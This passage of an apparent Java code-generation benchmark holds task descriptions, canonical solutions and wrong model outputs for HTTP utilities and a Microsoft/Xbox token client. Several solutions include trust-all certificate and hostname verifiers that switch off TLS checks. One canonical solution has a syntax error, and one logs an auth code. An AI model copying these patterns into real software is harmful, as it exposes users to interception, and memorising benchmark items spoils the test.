maxResultSize = httpParam.getMaxResultSize();\n        Map<String,Object> headers = httpParam.getHeaders();\n        int readTimeout = httpParam.getReadTimeout();\n        int connectTimeout = httpParam.getConnectTimeout();\n        boolean ignoreContentIfUnsuccess = httpParam.isIgnoreContentIfUnsuccess();\n        boolean hostnameVerify = httpParam.isHostnameVerify();\n        TrustKeyStore trustKeyStore = httpParam.getTrustKeyStore();\n        ClientKeyStore clientKeyStore = httpParam.getClientKeyStore();\n        \n        if (url == null || url.trim().length() == 0) {\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        if(maxResultSize<=0){\n            throw new IllegalArgumentException(\"maxResultSize must be positive : \"+maxResultSize);\n        }\n        Charset.forName(charSet);\n        HttpURLConnection urlConn = null;\n        URL destURL = null;\n        \n        String baseUrl = url.trim();\n        if (!baseUrl.toLowerCase().startsWith(HTTPS_PREFIX) && !baseUrl.toLowerCase().startsWith(HTTP_PREFIX)) {\n            baseUrl = HTTP_PREFIX + baseUrl;\n        }\n\n        String method = null;\n        if (sMethod != null) {\n            method = sMethod.toUpperCase();\n        }\n        if (method == null\n                || !(method.equals(HTTP_METHOD_POST) || method\n                        .equals(HTTP_METHOD_GET))) {\n            throw new IllegalArgumentException(\"invalid http method : \"\n                    + method);\n        }\n        \n        int index = baseUrl.indexOf(\"?\");\n        if (index>0){\n            baseUrl = urlEncode(baseUrl, charSet);\n        }else if(index==0){\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        \n        String queryString = mapToQueryString(parameters, charSet);\n        String targetUrl = \"\";\n        if (method.equals(HTTP_METHOD_POST)) {\n            targetUrl = baseUrl;\n        } else {\n            if(index>0){\n                targetUrl = baseUrl +\"&\" + queryString;\n            }else{\n                targetUrl = baseUrl +\"?\" + queryString;\n            }\n        }\n        try {\n            destURL = new URL(targetUrl);\n            urlConn = (HttpURLConnection)destURL.openConnection();\n            \n            setSSLSocketFactory(urlConn, sslVerify, hostnameVerify, trustKeyStore, clientKeyStore);\n               \n            \n            boolean hasContentType = false;\n            boolean hasUserAgent = false;\n            for(String key : headers.keySet()){\n                if(\"Content-Type\".equalsIgnoreCase(key)){\n                    hasContentType = true;\n                }\n                if(\"user-agent\".equalsIgnoreCase(key)){\n                    hasUserAgent = true;\n                }\n            }\n            if(!hasContentType){\n                headers.put(\"Content-Type\", \"application/x-www-form-urlencoded; charset=\" + charSet);\n            }\n            if(!hasUserAgent){\n                headers.put(\"user-agent\", \"PlatSystem\");\n            }\n            \n            if(headers!=null && !headers.isEmpty()){\n                for(Entry<String, Object> entry : headers.entrySet()){\n                    String key = entry.getKey();\n                    Object value = entry.getValue();\n                    List<String> values = makeStringList(value);\n                    for(String v : values){\n                        urlConn.addRequestProperty(key, v);\n                    }\n                }\n            }\n            urlConn.setDoOutput(true);\n            urlConn.setDoInput(true);\n            urlConn.setAllowUserInteraction(false);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(connectTimeout);\n            urlConn.setReadTimeout(readTimeout);\n            \n            \n            \n            if (method.equals(HTTP_METHOD_POST)) {\n                String postData = queryString.length()==0?httpParam.getPostData():queryString;\n                if(postData!=null && postData.trim().length()>0){\n                    OutputStream os = urlConn.getOutputStream();\n                    OutputStreamWriter osw = new OutputStreamWriter(os, charSet);\n                    osw.write(postData);\n                    osw.flush();\n                    osw.close();\n                }\n            }\n\n            int responseCode = urlConn.getResponseCode();\n            Map<String, List<String>> responseHeaders = urlConn.getHeaderFields();\n            String contentType = urlConn.getContentType();\n                \n            SimpleHttpResult result = new SimpleHttpResult(responseCode);\n            result.setHeaders(responseHeaders);\n            result.setContentType(contentType);\n            \n            if(responseCode!=200 && ignoreContentIfUnsuccess){\n                return result;\n            }\n            \n            InputStream is = urlConn.getInputStream();\n            byte[] temp = new byte[1024];\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int readBytes = is.read(temp);\n            while(readBytes>0){\n                baos.write(temp, 0, readBytes);\n                readBytes =  is.read(temp);\n            }\n            String resultString = new String(baos.toByteArray(), charSet);\n            baos.close();\n            result.setContent(resultString);\n            return result;\n        } catch (Exception e) {\n            logger.warn(\"connection error : \" + e.getMessage());\n            return new SimpleHttpResult(e);\n        } finally {\n            if (urlConn != null) {\n                urlConn.disconnect();\n            }\n        }\n    }\n\n    private static class TrustAnyTrustManager implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }\n    \n    private static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"utf-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"error_message\";\n    public static final int DEFAULT_READ_TIMEOUT = 30000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 15000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 1024 * 1024;\n    public static final TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n\n    public static String httpPost(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String, String> params, String method, String charSet, Map<String, String> headers) {\n        try {\n            if (url == null || url.isEmpty()) {\n                throw new IllegalArgumentException(\"URL cannot be null or empty\");\n            }\n            if (method == null || (!method.equals(HTTP_METHOD_GET) && !method.equals(HTTP_METHOD_POST))) {\n                throw new IllegalArgumentException(\"Invalid HTTP method: \" + method);\n            }\n            HttpURLConnection urlConn = (HttpURLConnection) new URL(url).openConnection();\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(DEFAULT_CONNECT_TIMEOUT);\n            urlConn.setReadTimeout(DEFAULT_READ_TIMEOUT);\n            urlConn.setUseCaches(false);\n            urlConn.setDoInput(true);\n            if (method.equals(HTTP_METHOD_POST)) {\n                urlConn.setDoOutput(true);\n                String query = mapToQueryString(params, charSet);\n                try (OutputStream os = urlConn.getOutputStream()) {\n                    os.write(query.getBytes(charSet));\n                }\n            } else if (method.equals(HTTP_METHOD_GET)) {\n                String query = mapToQueryString(params, charSet);\n                if (query != null && !query.isEmpty()) {\n                    url += \"?\" + query;\n                }\n            }\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    urlConn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            setSSLSocketFactory(urlConn, true, true, null, null);\n            int responseCode = urlConn.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                try (InputStream is = urlConn.getInputStream();\n                     BufferedReader reader = new BufferedReader(new InputStreamReader(is, charSet))) {\n                    StringBuilder response = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                    return response.toString();\n                }\n            } else {\n                String errorMessage = \"HTTP error code: \" + responseCode;\n                logger.error(errorMessage);\n                throw new IOException(errorMessage);\n            }\n        } catch (Exception e) {\n            logger.error(\"Error making HTTP request\", e);\n            throw new RuntimeException(\"Error making HTTP request\", e);\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        try {\n            if (httpParam == null) {\n                throw new IllegalArgumentException(\"Http parameter cannot be null\");\n            }\n            String url = httpParam.getUrl();\n            Map<String, String> params = httpParam.getParams();\n            String method = httpParam.getMethod();\n            String charSet = httpParam.getCharSet();\n            Map<String, String> headers = httpParam.getHeaders();\n            boolean sslVerify = httpParam.isSslVerify();\n            boolean hostnameVerify = httpParam.isHostnameVerify();\n            TrustKeyStore trustKeyStore = httpParam.getTrustKeyStore();\n            ClientKeyStore clientKeyStore = httpParam.getClientKeyStore();\n            if (url == null || url.isEmpty()) {\n                throw new IllegalArgumentException(\"URL cannot be null or empty\");\n            }\n            if (method == null || (!method.equals(HTTP_METHOD_GET) && !method.equals(HTTP_METHOD_POST))) {\n                throw new IllegalArgumentException(\"Invalid HTTP method: \" + method);\n            }\n            HttpURLConnection urlConn = (HttpURLConnection) new URL(url).openConnection();\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(httpParam.getConnectTimeout());\n            urlConn.setReadTimeout(httpParam.getReadTimeout());\n            urlConn.setUseCaches(false);\n            urlConn.setDoInput(true);\n            if (method.equals(HTTP_METHOD_POST)) {\n                urlConn.setDoOutput(true);\n                String query = mapToQueryString(params, charSet);\n                try (OutputStream os = urlConn.getOutputStream()) {\n                    os.write(query.getBytes(charSet));\n                }\n            } else if (method.equals(HTTP_METHOD_GET)) {\n                String query = mapToQueryString(params, charSet);\n                if (query != null && !query.isEmpty()) {\n                    url += \"?\" + query;\n                }\n            }\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    urlConn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            setSSLSocketFactory(urlConn, sslVerify, hostnameVerify, trustKeyStore, clientKeyStore);\n            int responseCode = urlConn.getResponseCode();\n            String response = \"\";\n            if (responseCode >= 200 && responseCode < 300) {\n                try (InputStream is = urlConn.getInputStream();\n                     BufferedReader reader = new BufferedReader(new InputStreamReader(is, charSet))) {\n                    StringBuilder sb = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        sb.append(line);\n                    }\n                    response = sb.toString();\n                }\n            } else {\n                String errorMessage = \"HTTP error code: \" + responseCode;\n                logger.error(errorMessage);\n                throw new IOException(errorMessage);\n            }\n            return new SimpleHttpResult(responseCode, response);\n        } catch (Exception e) {\n            logger.error(\"Error making HTTP request\", e);\n            throw new RuntimeException(\"Error making HTTP request\", e);\n        }\n    }\n\n    public static String mapToQueryString(Map parameters, String charSet) {\n        if (parameters == null || parameters.isEmpty()) {\n            return null;\n        }\n        StringBuilder result = new StringBuilder();\n        for (Object key : parameters.keySet()) {\n            Object value = parameters.get(key);\n            if (value != null) {\n                if (result.length() > 0) {\n                    result.append(\"&\");\n                }\n                result.append(urlEncode(key.toString(), charSet)).append(\"=\").append(urlEncode(value.toString(), charSet));\n            }\n        }\n        return result.toString();\n    }\n\n    public static String urlEncode(String url, String charSet) {\n        try {\n            return URLEncoder.encode(url, charSet);\n        } catch (UnsupportedEncodingException e) {\n            logger.warn(\"Unsupported encoding: \" + charSet, e);\n            return url;\n        }\n    }\n\n    public static void setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) {\n        if (urlConn instanceof HttpsURLConnection) {\n            HttpsURLConnection httpsConn = (HttpsURLConnection) urlConn;\n            try {\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                TrustManager[] trustManagers = trustAnyManagers;\n                if (trustKeyStore != null) {\n                    KeyStore keyStore = KeyStore.getInstance(trustKeyStore.getType());\n                    keyStore.load(trustKeyStore.getInputStream(), trustKeyStore.getPassword().toCharArray());\n                    TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n                    tmf.init(keyStore);\n                    trustManagers = tmf.getTrustManagers();\n                }\n                HostnameVerifier hostnameVerifier = hostnameVerify ? new TrustAnyHostnameVerifier() : new DefaultHostnameVerifier();\n                if (sslVerify) {\n                    sslContext.init(null, trustManagers, new SecureRandom());\n                } else {\n                    sslContext.init(null, trustAnyManagers, new SecureRandom());\n                }\n                httpsConn.setSSLSocketFactory(sslContext.getSocketFactory());\n                httpsConn.setHostnameVerifier(hostnameVerifier);\n            } catch (Exception e) {\n                logger.warn(\"Failed to configure SSL socket factory\", e);\n            }\n        }\n    }\n\n    public static List<String> makeStringList(Object value) {\n        if (value == null) {\n            return Collections.emptyList();\n        }\n        if (value instanceof List) {\n            return (List<String>) value;\n        }\n        if (value instanceof String) {\n            return Collections.singletonList((String) value);\n        }\n        return Collections.singletonList(value.toString());\n    }\n\n    public static class TrustAnyTrustManager implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n\n    public static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response from the input stream, and return it as a UTF-8 encoded string. Proper error handling and resource cleanup should be implemented.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent.\n\nOutput: \n- String - The response from the HTTP GET request, or null if an error occurs.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetRequest {\n    public static String sendGetRequest(String requestUrl) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                return response.toString();\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a Java utility class for making asynchronous HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable headers and parameters. The class should handle response processing and error handling through callbacks.\n\nClass Description: HttpURLConnectionUtils is a final utility class that provides static methods for performing asynchronous HTTP requests. It encapsulates the complexity of HttpURLConnection and provides a simple callback-based interface for handling responses and errors.\n\nAttributes:\n\nTIMEOUT_IN_MILLIONS: int - The connection and read timeout duration in milliseconds (default: 5000)\n\nMethods:\n\ndoGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous HTTP GET request to the specified URL and invokes the callback with the response or error.\n\ndoPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous HTTP POST request to the specified URL with the given parameters and invokes the callback with the response or error.\n\nrequest(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic for both GET and POST methods, including setting headers, writing parameters, and processing the response.\n\nCallback: interface - Defines two methods for handling request outcomes:\n  onResponse(String result, long response) -> void - Called when the request succeeds\n  onFail(Throwable error) -> void - Called when the request fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(\n            final String urlStr,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(\n            final String urlStr,\n            final String params,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n\n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n    public static final int TIMEOUT_IN_MILLIS = 5000;\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(method);\n                connection.setConnectTimeout(TIMEOUT_IN_MILLIS);\n                connection.setReadTimeout(TIMEOUT_IN_MILLIS);\n                connection.setUseCaches(false);\n                connection.setDoInput(true);\n                if (\"POST\".equals(method)) {\n                    connection.setDoOutput(true);\n                    if (params != null) {\n                        try (OutputStream os = connection.getOutputStream()) {\n                            os.write(params.getBytes());\n                        }\n                    }\n                }\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        connection.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n                int responseCode = connection.getResponseCode();\n                StringBuilder response = new StringBuilder();\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                } catch (Exception e) {\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            response.append(line);\n                        }\n                    }\n                }\n                callback.onResponse(response.toString(), responseCode);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n}\n```"
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Implement a Java class for handling Microsoft authentication flows, including acquiring access tokens, Xbox Live tokens, and XSTS tokens for Minecraft services authentication.\n\nClass Description: The MicrosoftHttpClient class provides methods to authenticate with Microsoft's OAuth2.0 service and obtain various tokens required for Xbox Live and Minecraft services authentication. It handles HTTP communication with Microsoft's authentication endpoints and processes JSON responses.\n\nAttributes:\nXSTS_ERRORS: Map<Long, Integer> - A static map containing XSTS error codes mapped to corresponding error message resource IDs\n\nMethods:\nacquireAccessToken: acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) -> String - Acquires an OAuth access token from Microsoft's authentication service. Uses either an authorization code or refresh token based on the isRefresh parameter.\n\nacquireXBLToken: acquireXBLToken(String accessToken, String xblAuthUrl) -> String - Acquires an Xbox Live (XBL) token using the Microsoft OAuth access token.\n\nacquireXsts: acquireXsts(String xblToken, String xstsAuthUrl) -> String[] - Acquires XSTS (Xbox Secure Token Service) token and user hash using the XBL token. Returns an array containing the user hash and token.\n\nsetCommonProperties: setCommonProperties(HttpURLConnection conn, String formData) -> void - Helper method to set common HTTP connection properties for JSON requests.\n\nconvertToFormData: convertToFormData(String... data) -> String - Converts key-value pairs into URL-encoded form data format.\n\ngetResponseThrowable: getResponseThrowable(HttpURLConnection conn) -> RuntimeException - Creates an appropriate exception based on HTTP response status code.",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Collections;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n\n    private static final Map<Long, Integer> XSTS_ERRORS;\n    static {\n        XSTS_ERRORS = new ArrayMap<>();\n        XSTS_ERRORS.put(2148916233L, R.string.xerr_no_account);\n        XSTS_ERRORS.put(2148916235L, R.string.xerr_not_available);\n        XSTS_ERRORS.put(2148916236L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916237L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916238L ,R.string.xerr_child);\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws IOException, JSONException {\n        URL url = new URL(authTokenUrl);\n        Log.i(\"MicrosoftLogin\", \"isRefresh=\" + isRefresh + \", authCode= \"+authcode);\n\n        String formData = convertToFormData(\n                \"client_id\", \"00000000402b5328\",\n                isRefresh ? \"refresh_token\" : \"code\", authcode,\n                \"grant_type\", isRefresh ? \"refresh_token\" : \"authorization_code\",\n                \"redirect_url\", \"https://login.live.com/oauth20_desktop.srf\",\n                \"scope\", \"service::user.auth.xboxlive.com::MBI_SSL\"\n        );\n\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n        conn.setRequestMethod(\"POST\");\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n        conn.connect();\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(formData.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"access_token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xblAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"AuthMethod\", \"RPS\");\n        properties.put(\"SiteName\", \"user.auth.xboxlive.com\");\n        properties.put(\"RpsTicket\", accessToken);\n        data.put(\"Properties\",properties);\n        data.put(\"RelyingParty\", \"http://auth.xboxlive.com\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"Token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xstsAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"SandboxId\", \"RETAIL\");\n        properties.put(\"UserTokens\", new JSONArray(Collections.singleton(xblToken)));\n        data.put(\"Properties\", properties);\n        data.put(\"RelyingParty\", \"rp://api.minecraftservices.com/\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            String uhs = jo.getJSONObject(\"DisplayClaims\").getJSONArray(\"xui\").getJSONObject(0).getString(\"uhs\");\n            String token = jo.getString(\"Token\");\n            conn.disconnect();\n            return new String[]{uhs, token};\n        }else if(conn.getResponseCode() == 401) {\n            String responseContents = Tools.read(conn.getErrorStream());\n            JSONObject jo = new JSONObject(responseContents);\n            long xerr = jo.optLong(\"XErr\", -1);\n            Integer locale_id = XSTS_ERRORS.get(xerr);\n            if(locale_id != null) {\n                throw new PresentedException(new RuntimeException(responseContents), locale_id);\n            }\n            throw new PresentedException(new RuntimeException(responseContents), R.string.xerr_unknown, xerr);\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    private static void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        try {\n            conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n            conn.setRequestMethod(\"POST\");\n        }catch (ProtocolException e) {\n            Log.e(\"MicrosoftAuth\", e.toString());\n        }\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n    }\n\n    private static String convertToFormData(String... data) throws UnsupportedEncodingException {\n        StringBuilder builder = new StringBuilder();\n        for(int i=0; i<data.length; i+=2){\n            if (builder.length() > 0) builder.append(\"&\");\n            builder.append(URLEncoder.encode(data[i], \"UTF-8\"))\n                    .append(\"=\")\n                    .append(URLEncoder.encode(data[i+1], \"UTF-8\"));\n        }\n        return builder.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws IOException {\n        Log.i(\"MicrosoftLogin\", \"Error code: \" + conn.getResponseCode() + \": \" + conn.getResponseMessage());\n        if(conn.getResponseCode() == 429) {\n            return new PresentedException(R.string.microsoft_login_retry_later);\n        }\n        return new RuntimeException(conn.getResponseMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
